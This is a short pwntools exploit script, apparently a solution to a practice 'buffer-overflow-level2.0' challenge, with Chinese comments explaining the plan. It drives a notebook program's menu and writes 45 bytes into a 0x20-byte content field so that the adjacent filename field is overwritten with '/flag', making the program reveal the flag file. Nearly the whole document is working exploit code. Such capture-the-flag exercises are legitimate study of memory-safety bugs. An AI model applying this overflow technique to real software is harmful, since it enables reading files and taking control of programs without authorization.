from pwn import *
# set 
context(arch="amd64", os="linux", log_level="debug")
# excute
challenge_path = "/challenge/buffer-overflow-level2.0"
p = process(challenge_path)

# create string
contentt=p64(0x11111111)*4
sss="/flag"
p.sendlineafter("Choice >> \n","1")
p.sendlineafter("Input your notebook content:\n",contentt)
p.sendlineafter("Choice >> \n","2")
p.sendlineafter("Input your notebook size:\n","45")
p.sendlineafter("Input your notebook content:\n",contentt+sss.encode()+p64(0))
p.sendlineafter("Choice >> \n","666")

# 接收题目的输出
result = p.recvall()

# 打印题目的输出
print(result)
'''
读源码
mybook的第一段是0x20大小的content，第二段是0x10大小的filename
目标是通过写content覆盖到filename
先create mybook，然后edit两段内容size45
用pwntools发送指定内容，注意字符串的末尾符不要忘记
'''